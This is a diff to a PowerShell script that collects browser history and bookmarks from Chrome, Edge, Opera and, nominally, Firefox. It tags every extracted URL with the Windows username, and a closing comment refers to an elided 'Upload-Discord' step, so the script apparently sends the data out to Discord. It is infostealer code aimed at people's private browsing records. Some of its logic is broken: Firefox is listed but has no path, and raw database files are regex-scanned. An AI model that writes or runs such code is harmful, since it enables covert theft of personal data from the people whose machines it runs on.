@@ -8,9 +8,8 @@ function Get-BrowserData {
         [string]$DataType
     )
 
-    $query = @{
-        'history' = "SELECT url FROM urls"
-    }
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+    $Search = $Regex
 
     switch ($Browser.ToLower()) {
         'chrome' {
@@ -25,34 +24,32 @@ function Get-BrowserData {
             $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable"
             break
         }
-        default {
-            return
-        }
     }
 
     if ($DataType -eq 'history') {
         $Path = Join-Path $Path 'History'
-    } else {
-        return
+    } elseif ($DataType -eq 'bookmarks') {
+        $Path = Join-Path $Path 'Bookmarks'
     }
 
     if (Test-Path $Path) {
-        $browserData = Invoke-SqliteQuery -DataSource $Path -Query $query[$DataType] -ErrorAction SilentlyContinue
-        if ($null -ne $browserData) {
-            $browserData | ForEach-Object {
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+        $Value | ForEach-Object {
+            $Key = $_
+            if ($Key -match $Search) {
                 New-Object -TypeName PSObject -Property @{
                     User = $env:UserName
                     Browser = $Browser
                     DataType = $DataType
-                    Data = $_.url
+                    Data = $_
                 }
             }
         }
     }
 }
 
-$browsers = @("edge", "chrome", "opera")
-$dataTypes = @("history")
+$browsers = @("edge", "chrome", "firefox", "opera")
+$dataTypes = @("history", "bookmarks")
 
 foreach ($browser in $browsers) {
     foreach ($dataType in $dataTypes) {
@@ -61,6 +58,7 @@ foreach ($browser in $browsers) {
 }
 
 # ... Rest of the code (Upload-Discord function and execution)
+
 
 
 
